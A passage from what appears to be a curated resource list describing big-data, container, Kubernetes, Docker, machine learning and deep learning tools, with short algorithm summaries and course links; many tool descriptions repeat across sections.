larger-than-memory computing on a single machine, or on many different machines in a cluster. One Dask DataFrame operation triggers many operations on the constituent Pandas DataFrames. Neo4j is the only enterprise-strength graph database that combines native graph storage, advanced security, scalable speed-optimized architecture, and ACID compliance to ensure predictability and integrity of relationship-based queries. ElasticSearch is a search engine based on the Lucene library. It provides a distributed, multitenant-capable full-text search engine with an HTTP web interface and schema-free JSON documents. Elasticsearch is developed in Java. Logstash is a tool for managing events and logs. When used generically, the term encompasses a larger system of log collection, processing, storage and searching activities. Kibana is an open source data visualization plugin for Elasticsearch. It provides visualization capabilities on top of the content indexed on an Elasticsearch cluster. Users can create bar, line and scatter plots, or pie charts and maps on top of large volumes of data. Trino is a Distributed SQL query engine for big data. It is able to tremendously speed up ETL processes, allow them all to use standard SQL statement, and work with numerous data sources and targets all in the same system. Extract, transform, and load (ETL) is a data pipeline used to collect data from various sources, transform the data according to business rules, and load it into a destination data store. Redis(REmote DIctionary Server) is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker. It provides data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes, and streams. Apache OpenNLP is an open-source library for a machine learning based toolkit used in the processing of natural language text. It features an API for use cases like Named Entity Recognition, Sentence Detection, POS(Part-Of-Speech) tagging, Tokenization Feature extraction, Chunking, Parsing, and Coreference resolution. Open Neural Network Exchange(ONNX) is an open ecosystem that empowers AI developers to choose the right tools as their project evolves. ONNX provides an open source format for AI models, both deep learning and traditional ML. It defines an extensible computation graph model, as well as definitions of built-in operators and standard data types. Apache MXNet is a deep learning framework designed for both efficiency and flexibility. It allows you to mix symbolic and imperative programming to maximize efficiency and productivity. At its core, MXNet contains a dynamic dependency scheduler that automatically parallelizes both symbolic and imperative operations on the fly. A graph optimization layer on top of that makes symbolic execution fast and memory efficient. MXNet is portable and lightweight, scaling effectively to multiple GPUs and multiple machines. Support for Python, R, Julia, Scala, Go, Javascript and more. AutoGluon is toolkit for Deep learning that automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications. With just a few lines of code, you can train and deploy high-accuracy deep learning models on tabular, image, and text data. Anaconda is a very popular Data Science platform for machine learning and deep learning that enables users to develop models, train them, and deploy them. PlaidML is an advanced and portable tensor compiler for enabling deep learning on laptops, embedded devices, or other devices where the available computing hardware is not well supported or the available software stack contains unpalatable license restrictions. OpenCV is a highly optimized library with focus on real-time computer vision applications. The C++, Python, and Java interfaces support Linux, MacOS, Windows, iOS, and Android. Scikit-Learn is a Python module for machine learning built on top of SciPy, NumPy, and matplotlib, making it easier to apply robust and simple implementations of many popular machine learning algorithms. Weka is an open source machine learning software that can be accessed through a graphical user interface, standard terminal applications, or a Java API. It is widely used for teaching, research, and industrial applications, contains a plethora of built-in tools for standard machine learning tasks, and additionally gives transparent access to well-known toolboxes such as scikit-learn, R, and Deeplearning4j. Caffe is a deep learning framework made with expression, speed, and modularity in mind. It is developed by Berkeley AI Research (BAIR)/The Berkeley Vision and Learning Center (BVLC) and community contributors. Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently including tight integration with NumPy. Kubernetes Back to the Top      Building Highly-Availability(HA) Clusters with kubeadm. Source: Kubernetes.io Kubernetes Learning Resources Kubernetes (K8s) is an open-source system for automating deployment, scaling, and management of containerized applications. Getting Kubernetes Certifications Getting started with Kubernetes on AWS Kubernetes on Microsoft Azure Intro to Azure Kubernetes Service Azure Red Hat OpenShift  Getting started with Google Cloud Getting started with Kubernetes on Red Hat Getting started with Kubernetes on IBM Red Hat OpenShift on IBM Cloud Enable OpenShift Virtualization on Red Hat OpenShift YAML basics in Kubernetes Elastic Cloud on Kubernetes Docker and Kubernetes Running Apache Spark on Kubernetes Kubernetes Across VMware vRealize Automation VMware Tanzu Kubernetes Grid All the Ways VMware Tanzu Works with AWS VMware Tanzu Education Using Ansible in a Cloud-Native Kubernetes Environment Managing Kubernetes (K8s) objects with Ansible Setting up a Kubernetes cluster using Vagrant and Ansible Running MongoDB with Kubernetes Kubernetes Fluentd Understanding the new GitLab Kubernetes Agent Intro Local Process with Kubernetes for Visual Studio 2019 Kubernetes Contributors KubeAcademy from VMware Kubernetes Tutorials from Pulumi Kubernetes Playground by Katacoda Scalable Microservices with Kubernetes course from Udacity  Kubernetes Tools, Frameworks, and Projects Open Container Initiative is an open governance structure for the express purpose of creating open industry standards around container formats and runtimes. Buildah is a command line tool to build Open Container Initiative (OCI) images. It can be used with Docker, Podman, Kubernetes. Podman is a daemonless, open source, Linux native tool designed to make it easy to find, run, build, share and deploy applications using Open Containers Initiative (OCI) Containers and Container Images. Podman provides a command line interface (CLI) familiar to anyone who has used the Docker Container Engine. Containerd is a daemon that manages the complete container lifecycle of its host system, from image transfer and storage to container execution and supervision to low-level storage to network attachments and beyond. It is available for Linux and Windows. Google Kubernetes Engine (GKE) is a managed, production-ready environment for running containerized applications. Azure Kubernetes Service (AKS) is serverless Kubernetes, with a integrated continuous integration and continuous delivery (CI/CD) experience, and enterprise-grade security and governance. Unite your development and operations teams on a single platform to rapidly build, deliver, and scale applications with confidence. Amazon EKS is a tool that runs Kubernetes control plane instances across multiple Availability Zones to ensure high availability. AWS Controllers for Kubernetes (ACK) is a new tool that lets you directly manage AWS services from Kubernetes. ACK makes it simple to build scalable and highly-available Kubernetes applications that utilize AWS services. Container Engine for Kubernetes (OKE) is an Oracle-managed container orchestration service that can reduce the time and cost to build modern cloud native applications. Unlike most other vendors, Oracle Cloud Infrastructure provides Container Engine for Kubernetes as a free service that runs on higher-performance, lower-cost compute. Anthos is a modern application management platform that provides a consistent development and operations experience for cloud and on-premises environments. Red Hat Openshift is a fully managed Kubernetes platform that provides a foundation for on-premises, hybrid, and multicloud deployments. OKD is a community distribution of Kubernetes optimized for continuous application development and multi-tenant deployment. OKD adds developer and operations-centric tools on top of Kubernetes to enable rapid application development, easy deployment and scaling, and long-term lifecycle maintenance for small and large teams. Odo is a fast, iterative, and straightforward CLI tool for developers who write, build, and deploy applications on Kubernetes and OpenShift. Kata Operator is an operator to perform lifecycle management (install/upgrade/uninstall) of Kata Runtime on Openshift as well as Kubernetes cluster. Thanos is a set of components that can be composed into a highly available metric system with unlimited storage capacity, which can be added seamlessly on top of existing Prometheus deployments. OpenShift Hive is an operator which runs as a service on top of Kubernetes/OpenShift. The Hive service can be used to provision and perform initial configuration of OpenShift 4 clusters. Rook is a tool that turns distributed storage systems into self-managing, self-scaling, self-healing storage services. It automates the tasks of a storage administrator: deployment, bootstrapping, configuration, provisioning, scaling, upgrading, migration, disaster recovery, monitoring, and resource management. VMware Tanzu is a centralized management platform for consistently operating and securing your Kubernetes infrastructure and modern applications across multiple teams and private/public clouds. Kubespray is a tool that combines Kubernetes and Ansible to easily install Kubernetes clusters that can be deployed on AWS, GCE, Azure, OpenStack, vSphere, Packet (bare metal), Oracle Cloud Infrastructure (Experimental), or Baremetal. KubeInit provides Ansible playbooks and roles for the deployment and configuration of multiple Kubernetes distributions. Rancher is a complete software stack for teams adopting containers. It addresses the operational and security challenges of managing multiple Kubernetes clusters, while providing DevOps teams with integrated tools for running containerized workloads. K3s is a highly available, certified Kubernetes distribution designed for production workloads in unattended, resource-constrained, remote locations or inside IoT appliances. Helm is a Kubernetes Package Manager tool that makes it easier to install and manage Kubernetes applications. Knative is a Kubernetes-based platform to build, deploy, and manage modern serverless workloads. Knative takes care of the operational overhead details of networking, autoscaling (even to zero), and revision tracking. KubeFlow is a tool dedicated to making deployments of machine learning (ML) workflows on Kubernetes simple, portable and scalable. Etcd is a distributed key-value store that provides a reliable way to store data that needs to be accessed by a distributed system or cluster of machines. Etcd is used as the backend for service discovery and stores cluster state and configuration for Kubernetes. OpenEBS is a Kubernetes-based tool to create stateful applications using Container Attached Storage. Container Storage Interface (CSI) is an API that lets container orchestration platforms like Kubernetes seamlessly communicate with stored data via a plug-in. MicroK8s is a tool that delivers the full Kubernetes experience. In a Fully containerized deployment with compressed over-the-air updates for ultra-reliable operations. It is supported on Linux, Windows, and MacOS. Charmed Kubernetes is a well integrated, turn-key, conformant Kubernetes platform, optimized for your multi-cloud environments developed by Canonical. Grafana Kubernetes App is a toll that allows you to monitor your Kubernetes cluster's performance. It includes 4 dashboards, Cluster, Node, Pod/Container and Deployment. It allows for the automatic deployment of the required Prometheus exporters and a default scrape config to use with your in cluster Prometheus deployment. KubeEdge is an open source system for extending native containerized application orchestration capabilities to hosts at Edge.It is built upon kubernetes and provides fundamental infrastructure support for network, app. deployment and metadata synchronization between cloud and edge. Lens  is the most powerful IDE for people who need to deal with Kubernetes clusters on a daily basis. It has support for MacOS, Windows and Linux operating systems. kind is a tool for running local Kubernetes clusters using Docker container “nodes”. It was primarily designed for testing Kubernetes itself, but may be used for local development or CI. Flux CD is a tool that automatically ensures that the state of your Kubernetes cluster matches the configuration you've supplied in Git. It uses an operator in the cluster to trigger deployments inside Kubernetes, which means that you don't need a separate continuous delivery tool. Platform9 Managed Kubernetes (PMK) is a Kubernetes as a service that ensures fully automated Day-2 operations with 99.9% SLA on any environment, whether in data-centers, public clouds, or at the edge. Docker Back to the Top         Container Architecture. Source: Containerd.io Docker Learning Resources Docker Training Program Docker Certified Associate (DCA) certification Docker Documentation | Docker Documentation The Docker Workshop Docker Courses on Udemy Docker Courses on Coursera Docker Courses on edX Docker Courses on Linkedin Learning Docker Tools Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly working in collaboration with cloud, Linux, and Windows vendors, including Microsoft. Docker Enterprise is a subscription including software, supported and certified container platform for CentOS, Red Hat Enterprise Linux (RHEL), Ubuntu, SUSE Linux Enterprise Server (SLES), Oracle Linux, and Windows Server 2016, as well as for cloud providers AWS and Azure. In November 2019 Docker's Enterprise Platform business was acquired by Mirantis. Docker Desktop is an application for MacOS and Windows machines for the building and sharing of containerized applications and microservices. Docker Desktop delivers the speed, choice and security you need for designing and delivering containerized applications on your desktop. Docker Desktop includes Docker App, developer tools, Kubernetes and version synchronization to production Docker Engines. Docker Hub is the world's largest library and community for container images Browse over 100,000 container images from software vendors, open-source projects, and the community. Docker Compose is a tool that was developed to help define and share multi-container applications. With Docker Compose, you can create a YAML file to define the services and with a single command, can spin everything up or tear it all down. Docker Swarm is a Docker-native clustering system swarm is a simple tool which controls a cluster of Docker hosts and exposes it as a single ""virtual"" host. Dockerfile is a text document that contains all the commands a user could call on the command line to assemble an image. Using docker build users can create an automated build that executes several command-line instructions in succession. Docker Containers is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another. Docker Engine is a container runtime that runs on various Linux (CentOS, Debian, Fedora, Oracle Linux, RHEL, SUSE, and Ubuntu) and Windows Server operating systems. Docker creates simple tooling and a universal packaging approach that bundles up all application dependencies inside a container which is then run on Docker Engine. Docker Images is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings. Images have intermediate layers that increase reusability, decrease disk usage, and speed up docker build by allowing each step to be cached. These intermediate layers are not shown by default. The SIZE is the cumulative space taken up by the image and all its parent images. Docker Network is a that displays detailed information on one or more networks. Docker Daemon is a service started by a system utility, not manually by a user. This makes it easier to automatically start Docker when the machine reboots. The command to start Docker depends on your operating system. Currently, it only runs on Linux because it depends on a number of Linux kernel features, but there are a few ways to run Docker on MacOS and Windows as well by configuring the operating system utilities. Docker Storage is a driver controls how images and containers are stored and managed on your Docker host. Kitematic is a simple application for managing Docker containers on Mac, Linux and Windows letting you control your app containers from a graphical user interface (GUI). Open Container Initiative is an open governance structure for the express purpose of creating open industry standards around container formats and runtimes. Buildah is a command line tool to build Open Container Initiative (OCI) images. It can be used with Docker, Podman, Kubernetes. Podman is a daemonless, open source, Linux native tool designed to make it easy to find, run, build, share and deploy applications using Open Containers Initiative (OCI) Containers and Container Images. Podman provides a command line interface (CLI) familiar to anyone who has used the Docker Container Engine. Containerd is a daemon that manages the complete container lifecycle of its host system, from image transfer and storage to container execution and supervision to low-level storage to network attachments and beyond. It is available for Linux and Windows. Machine Learning Back to the Top     Learning Resources for ML Machine Learning is a branch of artificial intelligence (AI) focused on building apps using algorithms that learn from data models and improve their accuracy over time without needing to be programmed. Machine Learning by Stanford University from Coursera AWS Training and Certification for Machine Learning (ML) Courses Machine Learning Scholarship Program for Microsoft Azure from Udacity Microsoft Certified: Azure Data Scientist Associate Microsoft Certified: Azure AI Engineer Associate Azure Machine Learning training and deployment Learning Machine learning and artificial intelligence from Google Cloud Training Machine Learning Crash Course for Google Cloud JupyterLab Scheduling Jupyter notebooks on Amazon SageMaker ephemeral instances How to run Jupyter Notebooks in your Azure Machine Learning workspace Machine Learning Courses Online from Udemy Machine Learning Courses Online from Coursera Learn Machine Learning with Online Courses and Classes from edX ML Frameworks, Libraries, and Tools TensorFlow is an end-to-end open source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML powered applications. Keras is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano.It was developed with a focus on enabling fast experimentation. It is capable of running on top of TensorFlow, Microsoft Cognitive Toolkit, R, Theano, or PlaidML. PyTorch is a library for deep learning on irregular input data such as graphs, point clouds, and manifolds. Primarily developed by Facebook's AI Research lab. Amazon SageMaker is a fully managed service that provides every developer and data scientist with the ability to build, train, and deploy machine learning (ML) models quickly. SageMaker removes the heavy lifting from each step of the machine learning process to make it easier to develop high quality models. Azure Databricks is a fast and collaborative Apache Spark-based big data analytics service designed for data science and data engineering. Azure Databricks, sets up your Apache Spark environment in minutes, autoscale, and collaborate on shared projects in an interactive workspace. Azure Databricks supports Python, Scala, R, Java, and SQL, as well as data science frameworks and libraries including TensorFlow, PyTorch, and scikit-learn. Microsoft Cognitive Toolkit (CNTK) is an open-source toolkit for commercial-grade distributed deep learning. It describes neural networks as a series of computational steps via a directed graph. CNTK allows the user to easily realize and combine popular model types such as feed-forward DNNs, convolutional neural networks (CNNs) and recurrent neural networks (RNNs/LSTMs). CNTK implements stochastic gradient descent (SGD, error backpropagation) learning with automatic differentiation and parallelization across multiple GPUs and servers. Apple CoreML is a framework that helps integrate machine learning models into your app. Core ML provides a unified representation for all models. Your app uses Core ML APIs and user data to make predictions, and to train or fine-tune models, all on the user's device. A model is the result of applying a machine learning algorithm to a set of training data. You use a model to make predictions based on new input data. Tensorflow_macOS is a Mac-optimized version of TensorFlow and TensorFlow Addons for macOS 11.0+ accelerated using Apple's ML Compute framework. Apache OpenNLP is an open-source library for a machine learning based toolkit used in the processing of natural language text. It features an API for use cases like Named Entity Recognition, Sentence Detection, POS(Part-Of-Speech) tagging, Tokenization Feature extraction, Chunking, Parsing, and Coreference resolution. Apache Airflow is an open-source workflow management platform created by the community to programmatically author, schedule and monitor workflows. Install. Principles. Scalable. Airflow has a modular architecture and uses a message queue to orchestrate an arbitrary number of workers. Airflow is ready to scale to infinity. Open Neural Network Exchange(ONNX) is an open ecosystem that empowers AI developers to choose the right tools as their project evolves. ONNX provides an open source format for AI models, both deep learning and traditional ML. It defines an extensible computation graph model, as well as definitions of built-in operators and standard data types. Apache MXNet is a deep learning framework designed for both efficiency and flexibility. It allows you to mix symbolic and imperative programming to maximize efficiency and productivity. At its core, MXNet contains a dynamic dependency scheduler that automatically parallelizes both symbolic and imperative operations on the fly. A graph optimization layer on top of that makes symbolic execution fast and memory efficient. MXNet is portable and lightweight, scaling effectively to multiple GPUs and multiple machines. Support for Python, R, Julia, Scala, Go, Javascript and more. AutoGluon is toolkit for Deep learning that automates machine learning tasks enabling you to easily achieve strong predictive performance in your applications. With just a few lines of code, you can train and deploy high-accuracy deep learning models on tabular, image, and text data. Anaconda is a very popular Data Science platform for machine learning and deep learning that enables users to develop models, train them, and deploy them. PlaidML is an advanced and portable tensor compiler for enabling deep learning on laptops, embedded devices, or other devices where the available computing hardware is not well supported or the available software stack contains unpalatable license restrictions. OpenCV is a highly optimized library with focus on real-time computer vision applications. The C++, Python, and Java interfaces support Linux, MacOS, Windows, iOS, and Android. Scikit-Learn is a Python module for machine learning built on top of SciPy, NumPy, and matplotlib, making it easier to apply robust and simple implementations of many popular machine learning algorithms. Weka is an open source machine learning software that can be accessed through a graphical user interface, standard terminal applications, or a Java API. It is widely used for teaching, research, and industrial applications, contains a plethora of built-in tools for standard machine learning tasks, and additionally gives transparent access to well-known toolboxes such as scikit-learn, R, and Deeplearning4j. Caffe is a deep learning framework made with expression, speed, and modularity in mind. It is developed by Berkeley AI Research (BAIR)/The Berkeley Vision and Learning Center (BVLC) and community contributors. Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently including tight integration with NumPy. nGraph is an open source C++ library, compiler and runtime for Deep Learning. The nGraph Compiler aims to accelerate developing AI workloads using any deep learning framework and deploying to a variety of hardware targets.It provides the freedom, performance, and ease-of-use to AI developers. NVIDIA cuDNN is a GPU-accelerated library of primitives for deep neural networks. cuDNN provides highly tuned implementations for standard routines such as forward and backward convolution, pooling, normalization, and activation layers. cuDNN accelerates widely used deep learning frameworks, including Caffe2, Chainer, Keras, MATLAB, MxNet, PyTorch, and TensorFlow. Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. Jupyter is used widely in industries that do data cleaning and transformation, numerical simulation, statistical modeling, data visualization, data science, and machine learning. Apache Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Apache Spark Connector for SQL Server and Azure SQL is a high-performance connector that enables you to use transactional data in big data analytics and persists results for ad-hoc queries or reporting. The connector allows you to use any SQL database, on-premises or in the cloud, as an input data source or output data sink for Spark jobs. Apache PredictionIO is an open source machine learning framework for developers, data scientists, and end users. It supports event collection, deployment of algorithms, evaluation, querying predictive results via REST APIs. It is based on scalable open source services like Hadoop, HBase (and other DBs), Elasticsearch, Spark and implements what is called a Lambda Architecture. Cluster Manager for Apache Kafka(CMAK) is a tool for managing Apache Kafka clusters. BigDL is a distributed deep learning library for Apache Spark. With BigDL, users can write their deep learning applications as standard Spark programs, which can directly run on top of existing Spark or Hadoop clusters. Eclipse Deeplearning4J (DL4J) is a set of projects intended to support all the needs of a JVM-based(Scala, Kotlin, Clojure, and Groovy) deep learning application. This means starting with the raw data, loading and preprocessing it from wherever and whatever format it is in to building and tuning a wide variety of simple and complex deep learning networks. Tensorman is a utility for easy management of Tensorflow containers by developed by System76.Tensorman allows Tensorflow to operate in an isolated environment that is contained from the rest of the system. This virtual environment can operate independent of the base system, allowing you to use any version of Tensorflow on any version of a Linux distribution that supports the Docker runtime. Numba is an open source, NumPy-aware optimizing compiler for Python sponsored by Anaconda, Inc. It uses the LLVM compiler project to generate machine code from Python syntax. Numba can compile a large subset of numerically-focused Python, including many NumPy functions. Additionally, Numba has support for automatic parallelization of loops, generation of GPU-accelerated code, and creation of ufuncs and C callbacks. Chainer is a Python-based deep learning framework aiming at flexibility. It provides automatic differentiation APIs based on the define-by-run approach (dynamic computational graphs) as well as object-oriented high-level APIs to build and train neural networks. It also supports CUDA/cuDNN using CuPy for high performance training and inference. XGBoost is an optimized distributed gradient boosting library designed to be highly efficient, flexible and portable. It implements machine learning algorithms under the Gradient Boosting framework. XGBoost provides a parallel tree boosting (also known as GBDT, GBM) that solve many data science problems in a fast and accurate way. It supports distributed training on multiple machines, including AWS, GCE, Azure, and Yarn clusters. Also, it can be integrated with Flink, Spark and other cloud dataflow systems. cuML is a suite of libraries that implement machine learning algorithms and mathematical primitives functions that share compatible APIs with other RAPIDS projects. cuML enables data scientists, researchers, and software engineers to run traditional tabular ML tasks on GPUs without going into the details of CUDA programming. In most cases, cuML's Python API matches the API from scikit-learn. Algorithms Back to the Top Fuzzy logic is a heuristic approach that allows for more advanced decision-tree processing and better integration with rules-based programming.     Architecture of a Fuzzy Logic System. Source: ResearchGate Support Vector Machine (SVM) is a supervised machine learning model that uses classification algorithms for two-group classification problems.     Support Vector Machine (SVM). Source:OpenClipArt Neural networks are a subset of machine learning and are at the heart of deep learning algorithms. The name/structure is inspired by the human brain copying the process that biological neurons/nodes signal to one another.     Deep neural network. Source: IBM Convolutional Neural Networks (R-CNN) is an object detection algorithm that first segments the image to find potential relevant bounding boxes and then run the detection algorithm to find most probable objects in those bounding boxes.     Convolutional Neural Networks. Source:CS231n Recurrent neural networks (RNNs) is a type of artificial neural network which uses sequential data or time series data.     Recurrent Neural Networks. Source: Slideteam Multilayer Perceptrons (MLPs) is multi-layer neural networks composed of multiple layers of perceptrons with a threshold activation.     Multilayer Perceptrons. Source: DeepAI Random forest is a commonly-used machine learning algorithm, which combines the output of multiple decision trees to reach a single result. A decision tree in a forest cannot be pruned for sampling and therefore, prediction selection. Its ease of use and flexibility have fueled its adoption, as it handles both classification and regression problems.     Random forest. Source: wikimedia Decision trees are tree-structured models for classification and regression.     Decision Trees. Source: CMU Naive Bayes is a machine learning algorithm that is used solved calssification problems. It's based on applying Bayes' theorem with strong independence assumptions between the features.     Bayes' theorem. Source:mathisfun Deep Learning Development Back to the Top     Deep Learning Learning Resources Deep Learning is a subset of machine learning, which is essentially a neural network with three or more layers. These neural networks attempt to simulate the behavior of the human brain,though, far from matching its ability. This allows the neural networks to ""learn"" from large amounts of data. The Learning can be supervised, semi-supervised or unsupervised. Deep Learning Online Courses | NVIDIA Top Deep Learning Courses Online | Coursera Top Deep Learning Courses Online | Udemy Learn Deep Learning with Online Courses and Lessons | edX Deep Learning Online Course Nanodegree | Udacity Machine Learning Course by Andrew Ng | Coursera Machine Learning Engineering for Production (MLOps) course by Andrew Ng | Coursera Data Science: Deep Learning and Neural Networks in Python | Udemy Understanding Machine Learning with Python | Pluralsight  How to Think About Machine Learning Algorithms | Pluralsight Deep Learning Courses | Stanford Online Deep Learning - UW Professional & Continuing Education Deep Learning Online Courses | Harvard University Machine Learning for Everyone Courses | DataCamp Artificial Intelligence Expert Course: Platinum Edition | Udemy Top Artificial Intelligence Courses Online | Coursera Learn Artificial Intelligence with Online Courses and Lessons | edX Professional Certificate in Computer Science for Artificial Intelligence | edX Artificial Intelligence Nanodegree program Artificial Intelligence (AI) Online Courses | Udacity Intro to Artificial Intelligence Course | Udacity Edge AI for IoT Developers Course | Udacity Reasoning: Goal Trees and Rule-Based Expert Systems | MIT OpenCourseWare Expert Systems and Applied Artificial Intelligence Autonomous Systems - Microsoft AI Introduction to Microsoft Project Bonsai Machine teaching with the Microsoft Autonomous Systems platform Autonomous Maritime Systems Training | AMC Search Top Autonomous Cars Courses Online | Udemy Applied Control Systems 1: autonomous cars: Math + PID + MPC | Udemy Learn Autonomous Robotics with Online Courses and Lessons | edX Artificial Intelligence Nanodegree program Autonomous Systems Online Courses & Programs | Udacity Edge AI for IoT Developers Course | Udacity Autonomous Systems MOOC and Free Online Courses | MOOC List Robotics and Autonomous Systems Graduate Program | Standford Online Mobile Autonomous Systems Laboratory | MIT OpenCourseWare Deep Learning Tools, Libraries, and Frameworks NVIDIA cuDNN is a GPU-accelerated library of primitives for deep neural networks. cuDNN provides highly tuned implementations for standard routines such as forward and backward convolution, pooling, normalization, and activation layers. cuDNN accelerates widely used deep learning frameworks, including Caffe2, Chainer, Keras, MATLAB, MxNet, PyTorch, and TensorFlow. NVIDIA DLSS (Deep Learning Super Sampling) is a temporal image upscaling AI rendering technology that increases graphics performance using dedicated Tensor Core AI processors on GeForce RTX™ GPUs. DLSS uses the power of a deep learning neural network to boost frame rates and generate beautiful, sharp images for your games. AMD FidelityFX Super Resolution (FSR) is an open source, high-quality solution for producing high resolution frames from lower resolution inputs. It uses a collection of cutting-edge Deep Learning algorithms with a particular emphasis on creating high-quality edges, giving large performance improvements compared to rendering at native resolution directly. FSR enables “practical performance” for costly render operations, such as hardware ray tracing for the AMD RDNA™ and AMD RDNA™ 2 architectures. Intel Xe Super Sampling (XeSS) is a temporal image upscaling AI rendering technology that increases graphics performance similar to NVIDIA's DLSS (Deep Learning Super Sampling). Intel's Arc GPU architecture (early 2022) will have GPUs that feature dedicated Xe-cores to run XeSS. The GPUs will have Xe Matrix eXtenstions matrix (XMX) engines for hardware-accelerated AI processing. XeSS will be able to run on devices without XMX, including integrated graphics, though, the performance of XeSS will be lower on non-Intel graphics cards because it will be powered by DP4a instruction. Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. Jupyter is used widely in industries that do data cleaning and transformation, numerical simulation, statistical modeling, data visualization, data science, and machine learning. Apache Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Apache Spark Connector for SQL Server and Azure SQL is a high-performance connector that enables you to use transactional data in big data analytics and persists results for ad-hoc queries or reporting. The connector allows you to use any SQL database, on-premises or in the cloud, as an input data source or output data sink for Spark jobs. Apache PredictionIO is an open source machine learning framework for developers, data scientists, and end users. It supports event collection, deployment of algorithms, evaluation, querying predictive results via REST APIs. It is based on scalable open source services like Hadoop, HBase (and other DBs), Elasticsearch, Spark and implements what is called a Lambda Architecture. Cluster Manager for Apache Kafka(CMAK) is a tool for managing Apache Kafka clusters. BigDL is a distributed deep learning library for Apache Spark. With BigDL, users can write their deep learning applications as standard Spark programs, which can directly run on top of existing Spark or Hadoop clusters. Eclipse Deeplearning4J (DL4J) is a set of projects intended to support all the needs of a JVM-based(Scala, Kotlin, Clojure, and Groovy) deep learning application. This means starting with the raw data, loading and preprocessing it from wherever and whatever format it is in to building and tuning a wide variety of simple and complex deep learning networks. Deep Learning Toolbox™ is a tool that provides a framework for designing and implementing deep neural networks with algorithms, pretrained models, and apps. You can use convolutional neural networks (ConvNets, CNNs) and long short-term memory (LSTM) networks to perform classification and regression on image, time-series, and text data. You can build network architectures such as generative adversarial networks (GANs) and Siamese networks using automatic differentiation, custom training loops, and shared weights. With the Deep Network Designer app, you can design, analyze, and train networks graphically. It can exchange models with TensorFlow™ and PyTorch through the ONNX format and import models from TensorFlow-Keras and Caffe. The toolbox supports transfer learning with DarkNet-53, ResNet-50, NASNet, SqueezeNet and many other pretrained models. Reinforcement Learning Toolbox™ is a tool that provides an app, functions, and a Simulink® block for training policies using reinforcement learning algorithms, including DQN, PPO, SAC, and DDPG. You can use these policies to implement controllers and decision-making algorithms for complex applications such as resource allocation, robotics, and autonomous systems. Deep Learning HDL Toolbox™ is a tool that provides functions and tools to prototype and implement deep learning networks on FPGAs and SoCs. It provides pre-built bitstreams for running a variety of deep learning networks on supported Xilinx® and Intel® FPGA and SoC devices. Profiling and estimation tools let you customize a deep learning network by exploring design, performance, and resource utilization tradeoffs. Parallel Computing Toolbox™ is a tool that lets you solve computationally and data-intensive problems using multicore processors, GPUs, and computer clusters. High-level constructs such as parallel for-loops, special array types, and parallelized numerical algorithms enable you to parallelize MATLAB® applications without CUDA or MPI programming. The toolbox lets you use parallel-enabled functions in MATLAB and other toolboxes. You can use the toolbox with Simulink® to run multiple simulations of a model in parallel. Programs and models can run in both interactive and batch modes. XGBoost is an optimized distributed gradient boosting library designed to be highly efficient, flexible and portable. It implements machine learning algorithms under the Gradient Boosting framework. XGBoost provides a parallel tree boosting (also known as GBDT, GBM) that solve many data science problems in a fast and accurate way. It supports distributed training on multiple machines, including AWS, GCE, Azure, and Yarn clusters. Also, it can be integrated with Flink, Spark and other cloud dataflow systems. LIBSVM is an integrated software for support vector classification, (C-SVC, nu-SVC), regression (epsilon-SVR, nu-SVR) and distribution estimation (one-class SVM). It supports multi-class classification. Scikit-Learn is a simple and efficient tool for data mining and data analysis. It is built on NumPy,SciPy, and mathplotlib. TensorFlow is an end-to-end open source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML powered applications. Keras is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano.It was developed with a focus on enabling fast experimentation. It is capable of running on top of TensorFlow, Microsoft Cognitive Toolkit, R, Theano, or PlaidML. PyTorch is a library for deep learning on irregular input data such as graphs, point clouds, and manifolds. Primarily developed by Facebook's AI Research lab. Azure Databricks is a fast and collaborative Apache Spark-based big data analytics service designed for data science and data engineering. Azure Databricks, sets up your Apache Spark environment in minutes, autoscale, and collaborate on shared projects in an interactive workspace. Azure Databricks supports Python, Scala, R, Java, and SQL, as well as data science frameworks and libraries including TensorFlow, PyTorch, and scikit-learn. Microsoft Cognitive Toolkit (CNTK) is an open-source toolkit for commercial-grade distributed deep learning. It describes neural networks as a series of computational steps via a directed graph. CNTK allows the user to easily realize and combine popular model types such as feed-forward DNNs, convolutional neural networks (CNNs) and recurrent neural networks (RNNs/LSTMs). CNTK implements stochastic gradient descent (SGD, error backpropagation) learning with automatic differentiation and parallelization across multiple GPUs and servers. Tensorflow_macOS is a Mac-optimized version of TensorFlow and TensorFlow Addons for macOS 11.0+ accelerated using Apple's ML Compute framework. Apache Airflow is an open-source workflow management platform created by the community to programmatically author, schedule and monitor workflows. Install. Principles. Scalable. Airflow has a modular architecture and uses a message queue to orchestrate an arbitrary number of workers. Airflow is ready to scale to infinity. Open Neural Network Exchange(ONNX) is an open ecosystem that empowers AI developers to choose the right tools as their project evolves. ONNX provides an open source format for AI models, both deep learning and traditional ML. It defines an extensible computation graph model, as well as definitions of built-in operators and standard data types. Apache MXNet is a deep learning framework designed for both efficiency and flexibility. It allows you to mix symbolic and imperative programming to maximize efficiency and productivity. At its core, MXNet contains a dynamic dependency scheduler that automatically parallelizes both symbolic and imperative operations on the 